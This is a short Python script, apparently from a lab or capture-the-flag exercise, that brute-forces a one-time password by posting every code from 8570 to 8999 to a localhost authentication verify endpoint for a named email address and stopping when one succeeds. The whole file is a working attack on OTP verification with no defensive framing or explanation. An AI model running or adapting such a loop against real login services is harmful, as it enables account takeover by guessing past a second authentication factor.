import requests

url = "http://localhost:3001/api/auth/verify"
email = "mike@gmail.com"


for otp in range(8570, 9000):
    data = {
        "email": email,
        "otp": otp
    }

    print("Trying OTP:", otp)

    response = requests.post(url, data=data)
    print(response.text)
    
    if response.status_code == 200:
        password = response.text
        print("token found:", otp)
        break
